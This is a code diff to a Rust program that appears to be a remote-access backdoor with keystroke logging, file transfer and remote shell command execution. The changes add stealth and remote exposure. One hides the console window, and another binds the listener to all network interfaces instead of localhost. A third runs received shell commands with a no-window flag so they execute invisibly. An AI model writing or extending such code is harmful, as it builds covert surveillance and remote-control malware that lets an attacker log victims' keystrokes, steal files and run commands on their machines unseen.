@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 use chrono::Local;
 use rdev::{listen, EventType};
 use std::env;
@@ -14,7 +15,7 @@ mod utils;
 use utils::transfer_files::{receive_file, send_file, send_folder};
 
 fn main() -> std::io::Result<()> {
-    let listener = TcpListener::bind("127.0.0.1:8080").unwrap();
+    let listener = TcpListener::bind("0.0.0.0:8080").unwrap();
     let stream_mutex = Arc::new(Mutex::new(None::<TcpStream>));
     let keystroke_log = Arc::new(Mutex::new(String::new()));
 
@@ -186,12 +187,21 @@ fn execute_command(message: &str) -> io::Result<String> {
             let arg_flag = "-c";
 
             // Run the command within the shell
-            let output = Command::new(shell)
+            let mut command_process = Command::new(shell);
+            command_process
                 .arg(arg_flag)
                 .arg(trimmed_message)
                 .stdout(Stdio::piped())
-                .stderr(Stdio::piped())
-                .output()?;
+                .stderr(Stdio::piped());
+
+            #[cfg(target_os = "windows")]
+            {
+                use std::os::windows::process::CommandExt;
+                const CREATE_NO_WINDOW: u32 = 0x08000000;
+                command_process.creation_flags(CREATE_NO_WINDOW);
+            }
+
+            let output = command_process.output()?;
 
             // Get stdout and stderr
             let stdout = String::from_utf8_lossy(&output.stdout);
@@ -202,10 +212,7 @@ fn execute_command(message: &str) -> io::Result<String> {
             } else if !stderr.is_empty() {
                 Ok(stderr.to_string())
             } else {
-                Ok(format!(
-                    "Command '{}' executed successfully.\n",
-                    message
-                ))
+                Ok(format!("Command '{}' executed successfully.\n", message))
             }
         }
     } else {
